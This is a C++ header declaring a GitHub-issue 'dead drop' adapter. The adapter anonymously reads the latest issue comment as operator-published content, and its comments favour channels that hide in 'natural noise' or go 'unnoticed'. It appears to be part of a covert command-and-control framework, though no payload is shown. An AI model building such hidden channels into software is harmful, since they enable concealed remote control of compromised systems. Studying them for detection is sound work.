/**
 * @file GitHubIssueDeadDrop.hpp
 * @details
 * 平台形态(两种 URL 均支持, 按响应形状自适应):
 *   - Issue 正文: GET /repos/{o}/{r}/issues/{n}
 *       → 200 {"body": "<平台文本>"}                     → 取 body
 *   - 评论列表:   GET /repos/{o}/{r}/issues/{n}/comments
 *       → 200 [{"body": "..."}, ...]                     → 取**最后一条**的 body
 *     (运营更新 = 追加新评论, 旧内容自然沉底; 取末条即"最新发布")
 *
 * 请求头: User-Agent 必填(GitHub API 缺 UA 直接 403)。无认证 token —— 公开仓库
 * 匿名读, 配额 60 req/h/IP(恢复为低频按需触发, 一个恢复轮次仅 1 次 GET, 足够)。
 *
 * 与 Gist 适配器的分工: Gist 适合"无人注意的文件挂载", Issue 适合真人项目里
 * 的自然噪声(测试/演示首选)。解析(响应形状)在本适配器内, 内容层(DD1 信封)
 * 零感知 —— 平台化收口后的第二个适配器, 兼作"加平台三步"的样例。
 */
#pragma once

#include "Core/Exchange/IDeadDrop.hpp"
#include "Core/Comms/Platform/IHttpOps.hpp"

#include <string>

namespace cleat {
namespace deaddrop {

    class GitHubIssueDeadDrop : public IDeadDrop {
    public:
        /// @param http  通道层引用(调用者, 不拥有)
        /// @param apiUrl 完整 issue/comments REST 地址(公开仓库, 匿名读)
        GitHubIssueDeadDrop(IHttpOps& http, std::string apiUrl, int timeoutMs = 10000);

        std::optional<std::string> FetchRaw() override;
        std::string PlatformName() const override { return "github_issues"; }

    private:
        IHttpOps& http_;
        std::string apiUrl_;
        int timeoutMs_;
    };

} // namespace deaddrop
} // namespace cleat
